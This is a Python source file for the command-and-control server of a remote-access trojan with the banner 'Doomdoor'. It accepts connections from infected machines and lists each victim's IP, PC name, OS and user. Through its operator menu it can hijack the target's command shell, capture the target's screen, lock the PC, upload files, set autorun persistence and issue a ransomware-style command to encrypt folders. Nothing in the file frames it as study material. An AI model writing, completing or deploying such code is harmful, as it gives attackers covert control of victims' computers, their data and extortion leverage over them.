import os.path
import random
import socket
import string
import sys
import threading
import time
import tqdm
from queue import Queue

threads = 2
arrJobs = [1, 2]
queue = Queue()
arrAdresses = []
arrConnections = []

strHost = "localhost"
intPort = 8080
intBuff = 1024

strName = ("""\

    ___        _                 _                     
   /   \ ___  | | _ __ ___    __| |  ___    ___   _ __ 
  / /\ // _ \ | || '_ ` _ \  / _` | / _ \  / _ \ | '__|
 / /_//| (_) || || | | | | || (_| || (_) || (_) || |   
/___,'  \___/ |_||_| |_| |_| \__,_| \___/  \___/ |_|   
                                                                                         

""")

print(strName)

decode_utf = lambda data: data.decode("utf-8")

remove_quotes = lambda string: string.replace("\"", "")

center = lambda string, title: f"{{:^{len(string)}}}".format(title)

send = lambda data: connection.send(data)

sendall = lambda data: connection.sendall(data)

recv = lambda buffer: connection.recv(buffer)


def receiveAll(buffer):
    byteData = b""
    while True:
        bytePart = recv(buffer)
        if len(bytePart) == buffer:
            return bytePart
        byteData = byteData + bytePart

        if len(byteData) == buffer:
            return byteData


def create_socket():
    global objSocket
    try:
        objSocket = socket.socket()
        objSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    except socket.error() as error:
        print("Couldn't create Socket " + str(error))


def bind_socket():
    try:
        print("Listening on Port " + str(intPort))
        objSocket.bind((strHost, intPort))
        objSocket.listen(20)
    except socket.error() as error:
        print("Couldn't bind Socket " + str(error))
        bind_socket()


def accept_socket():
    while True:
        try:
            connection, address = objSocket.accept()
            connection.setblocking(1)  # timeout verhindern
            arrConnections.append(connection)
            client_info = decode_utf(connection.recv(intBuff)).split("',")
            address += client_info[0], client_info[1], client_info[0]
            arrAdresses.append(address)
            print("\n" + "Connection has been established : {0} ({1})".format(address[0], address[2]))
        except socket.error:
            print("Error while accepting connections!")
            continue


def help_menu():
    print("\n" + "--help")
    print("--l List all our connections")


def main_menu():
    while True:
        strChoice = input("\n" + "## ")

        if strChoice == "--l":
            list_connections()

        elif strChoice[:3] == "--i" and len(strChoice) > 3:
            connection = select_connection(strChoice[4:], "True")
            if connection is not None:
                send_commands()

        elif strChoice == "--x":
            close_connections()
            break
        else:
            print("Invalid input! You can use the --help command")


def close_connections():
    global arrConnections, arrAdresses

    if len(arrAdresses) == 0:
        return
    for intCounter, connection in enumerate(arrConnections):
        connection.send(str.encode("exit"))
        connection.close()
    del arrConnections
    arrConnections = []
    del arrAdresses
    arrAdresses = []


def list_connections():
    if len(arrConnections) > 0:
        strClients = ""

        for intCounter, connections in enumerate(arrConnections):
            strClients += str(intCounter) + 4 * " " + str(arrAdresses[intCounter][0]) + 4 * " " + \
                          str(arrAdresses[intCounter][1]) + 4 * " " + str(arrAdresses[intCounter][2]) + 4 * " " + \
                          str(arrAdresses[intCounter][3]) + "\n"
        print("\n" + "ID" + 3 * " " +
              center(str(arrAdresses[0][0]), "IP") + 4 * " " +
              center(str(arrAdresses[0][1]), "Port") + 4 * " " +
              center(str(arrAdresses[0][2]), "PC Name") + 4 * " " +
              center(str(arrAdresses[0][3]), "OS") + "\n" + strClients, end="")

    else:
        print("No connections!")


def select_connection(connectionID, getResponse):
    global connection, arrInfo
    try:
        connectionID = int(connectionID)
        connection = arrConnections[connectionID]
    except:
        print("Invalid input!")
        return
    else:
        # IP - PC Name - OS - User
        arrInfo = str(arrAdresses[connectionID][0]), str(arrAdresses[connectionID][2]), \
                  str(arrAdresses[connectionID][3]), str(arrAdresses[connectionID][4])
        if getResponse == "True":
            print("You are connected to: " + arrInfo[0] + " ..." + "\n")
        return connection


def command_shell():
    send(str.encode("cmd"))
    default = "\n" + decode_utf(recv(intBuff)) + ">"
    print(default, end="")

    while True:
        command = input()
        if command == "quit" or command == "exit":
            send(str.encode("goback"))
            return
        elif command == "cmd":
            print("You are already in the cmd")
        elif len(str(command)) > 0:
            send(str.encode(command))
            buffer = int(decode_utf(recv(intBuff)))
            clientResponse = decode_utf(receiveAll(buffer))
            print(clientResponse, end="")  # print cmd output
        else:
            print(default, end="")


def autorun():
    send(str.encode("autorun"))


def get_random_string(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))


def encrypt_data(path):
    with open("encrypt_key.txt", "w") as crypt:
        crypt.write(get_random_string(500))
    send(str.encode("encode-%s" % arrAdresses[0]))


def decrypt_data(path):
    pass


def uploadFile(filename):
    if not os.path.exists(filename):
        print("File does not exits!")
        return

    send(str.encode("file"))
    filesize = os.path.getsize(filename)
    clientResponse = decode_utf(recv(intBuff))
    print(clientResponse)
    send(str.encode(f"{filename}"))
    clientResponse1 = decode_utf(recv(intBuff))
    print(clientResponse1)
    send(str.encode(f"{filesize}"))

    fileToSend = open(filename, "rb")
    print("File ready to be send")
    l = fileToSend.read(intBuff)
    progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
    while l:
        try:
            send(l)
            l = fileToSend.read(intBuff)
            progress.update(len(l))
        except ConnectionResetError:
            print("Connection reset!")
            return
    fileToSend.close()
    print("File has been successfully sent to the Client")


def screenshot():
    send(str.encode("screen"))
    clientResponse = decode_utf(recv(intBuff))
    print("\n" + clientResponse)
    intBuffer = ""

    for intCounter in range(0, len(clientResponse)):
        if clientResponse[intCounter].isdigit():
            intBuffer += clientResponse[intCounter]
    intBuffer = int(intBuffer)
    strFile = time.strftime("screenshots/%Y%m%d%H%M%S" + ".png")
    data = receiveAll(intBuffer)
    objPic = open(strFile, "wb")
    objPic.write(data)
    objPic.close()
    print("Download done!" + "\n" + "Total bytes have been received: " + str(os.path.getsize(strFile)) + " bytes")


def send_commands():
    while True:
        strChoice = input("\n" + "Type Selection: ")

        if strChoice[:3] == "--m" and len(strChoice) > 3:
            message = "msg" + strChoice[4:]
            send(str.encode(message))
        elif strChoice[:3] == "--w" and len(strChoice) > 3:
            site = "site" + strChoice[4:]
            send(str.encode(site))
        elif strChoice[:3] == "--p":
            screenshot()
        elif strChoice[:3] == "--l":
            send(str.encode("lock"))
        elif strChoice[:3] == "--c":
            command_shell()
        elif strChoice[:3] == "--f" and len(strChoice) > 3:
            uploadFile(strChoice[4:])
        elif strChoice[:3] == "--a":
            autorun()
        elif strChoice[:5] == "--enc" and len(strChoice) > 5:
            encrypt_data(strChoice[6:])
        elif strChoice[:5] == "--dec" and len(strChoice) > 5:
            decrypt_data(strChoice[6:])
        elif strChoice[:4] == "exit":
            return;
        elif strChoice == "--help":
            strHelp = "Commands: " + \
                      "\n" + "--m" + 4 * " " + "->" + 4 * " " + "Write Messages with Pop-Up (--m Hello World)" + \
                      "\n" + "--w" + 4 * " " + "->" + 4 * " " + "Open website (--w www.google.com)" + \
                      "\n" + "--p" + 4 * " " + "->" + 4 * " " + "Make Screenshot from your targets screen (--p)" + \
                      "\n" + "--l" + 4 * " " + "->" + 4 * " " + "Lock the PC (--l)" + \
                      "\n" + "--c" + 4 * " " + "->" + 4 * " " + "Hijack the command shell (--c)" + \
                      "\n" + "--f" + 4 * " " + "->" + 4 * " " + "Upload File (--f Filename)" + \
                      "\n" + "--enc" + 2 * " " + "->" + 2 * " " + "Encrypt Folder with generated key in encrypt_key.txt (--enc path)" + \
                      "\n" + "--dec" + 2 * " " + "->" + 2 * " " + "Decrypt Folder with safed key in encrypt_key.txt  (--dec path)" + \
                      "\n" + "exit" + 3 * " " + "->" + 4 * " " + "Exit the Command Line and go to the main menu (exit)"
            print(strHelp)
        else:
            print("No valid command! Use --help for help!")


# multithreading

def create_threats():
    for _ in range(threads):
        thread = threading.Thread(target=work)
        thread.daemon = True
        thread.start()

    queue.join()


def create_jobs():
    for intThreads in arrJobs:
        queue.put(intThreads)
    queue.join()


def work():
    while True:
        intValue = queue.get()
        if intValue == 1:
            create_socket()
            bind_socket()
            accept_socket()
        elif intValue == 2:
            while True:
                time.sleep(0.2)
                if len(arrAdresses) > 0:
                    main_menu()
                    break
        queue.task_done()
        queue.task_done()
        sys.exit(0)


create_threats()
create_jobs()
